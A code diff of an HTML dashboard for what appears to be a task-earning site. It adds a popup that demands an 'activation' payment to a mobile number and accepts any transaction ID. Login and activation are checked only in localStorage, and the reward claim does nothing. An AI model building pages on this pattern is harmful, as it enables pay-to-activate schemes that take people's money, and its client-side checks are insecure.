@@ -1,25 +1,221 @@
-<!doctype html>
-<html lang="en"> 
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Dashboard</title> 
-  <link rel="stylesheet" href="style.css"> 
- </head> 
- <body> 
-  <div class="navbar"> 
-   <img src="https://i.imgur.com/KG8hJ6z.png" alt="Logo"> 
-   <div class="menu-icon" onclick="toggleMenu()">
-    ☰
-   </div> 
-   <div class="menu" id="menu"> <a href="#">Profile</a> <a href="#">Dashboard</a> <a href="#">Withdraw</a> <a href="#">Premium Membership</a> <a href="tasks.html">Tasks</a> <a href="help.html">Help Center</a> <a href="settings.html">Settings</a> <a href="#" onclick="logout()">Logout</a> 
-   </div> 
-  </div> 
-  <div class="container"> 
-   <div class="balance-box">
-    Balance: <span id="balance">৳0</span>
-   </div> <button id="claim-btn">Claim Now</button> 
-  </div> 
-  <script src="script.js"></script> 
- </body>
-</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5fff0;
+            margin: 0;
+            padding: 0;
+        }
+        /* Navbar */
+        .navbar {
+            background-color: #e8ffdb;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #a2d98e;
+            position: relative;
+        }
+        .navbar img {
+            height: 30px;
+        }
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .menu {
+            display: none;
+            position: absolute;
+            right: 10px;
+            top: 50px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0px 0px 5px #ccc;
+            width: 170px;
+        }
+        .menu a {
+            display: block;
+            padding: 10px;
+            text-decoration: none;
+            color: #333;
+            border-bottom: 1px solid #ddd;
+        }
+        .menu a:hover {
+            background: #a2d98e;
+            color: white;
+        }
+        /* Balance Box */
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0px 0px 5px #a2d98e;
+        }
+        .balance-box {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            padding: 20px;
+            background: #e8ffdb;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            background: #a2d98e;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .btn:hover {
+            background: #88c36b;
+        }
+        /* Activation Popup */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px #ccc;
+            text-align: center;
+            z-index: 1000;
+        }
+        .popup input {
+            width: 90%;
+            margin: 10px auto;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #a2d98e;
+        }
+        .popup button {
+            padding: 10px 20px;
+            background: #88c36b;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        /* Overlay */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <div class="navbar">
+        <img src="https://i.imgur.com/KG8hJ6z.png" alt="Logo">
+        <div class="menu-icon" onclick="toggleMenu()">☰</div>
+        <div class="menu" id="menu">
+            <a href="#">Profile</a>
+            <a href="#">Dashboard</a>
+            <a href="#">Withdraw</a>
+            <a href="#">Premium Membership</a>
+            <a href="#">Balance</a>
+            <a href="tasks.html">Tasks</a>
+            <a href="#">Help Center</a>
+            <a href="#" onclick="logout()">Logout</a>
+        </div>
+    </div>
+
+    <!-- Balance Section -->
+    <div class="container">
+        <div class="balance-box">Balance: ৳<span id="balance">0</span></div>
+        <button class="btn" onclick="claimReward()">Claim Now</button>
+    </div>
+
+    <!-- Activation Popup -->
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="activation-popup">
+        <h3>Activate Your Account</h3>
+        <p>Send payment to: <b>+8801XXXXXXXXX</b></p>
+        <button onclick="copyNumber()">Copy Number</button>
+        <input type="text" id="transaction-id" placeholder="Enter Transaction ID">
+        <button onclick="submitActivation()">Submit</button>
+    </div>
+
+    <script>
+        function toggleMenu() {
+            var menu = document.getElementById("menu");
+            menu.style.display = (menu.style.display === "block") ? "none" : "block";
+        }
+
+        function checkLogin() {
+            let user = localStorage.getItem("loggedInUser");
+            if (!user) {
+                alert("Please login first!");
+                window.location.href = "login.html";
+            }
+        }
+
+        function checkActivation() {
+            let user = localStorage.getItem("loggedInUser");
+            let userData = JSON.parse(localStorage.getItem(user));
+            if (!userData.activated) {
+                document.getElementById("overlay").style.display = "block";
+                document.getElementById("activation-popup").style.display = "block";
+            }
+        }
+
+        function copyNumber() {
+            navigator.clipboard.writeText("+8801XXXXXXXXX");
+            alert("Number copied!");
+        }
+
+        function submitActivation() {
+            let transactionId = document.getElementById("transaction-id").value;
+            if (transactionId === "") {
+                alert("Please enter Transaction ID");
+                return;
+            }
+            let user = localStorage.getItem("loggedInUser");
+            let userData = JSON.parse(localStorage.getItem(user));
+            userData.activated = true;
+            localStorage.setItem(user, JSON.stringify(userData));
+            alert("Activation request sent!");
+            document.getElementById("overlay").style.display = "none";
+            document.getElementById("activation-popup").style.display = "none";
+        }
+
+        function claimReward() {
+            alert("Feature coming soon!");
+        }
+
+        function logout() {
+            localStorage.removeItem("loggedInUser");
+            window.location.href = "login.html";
+        }
+
+        window.onload = function() {
+            checkLogin();
+            checkActivation();
+        };
+    </script>
+
+</body>
+             </html>
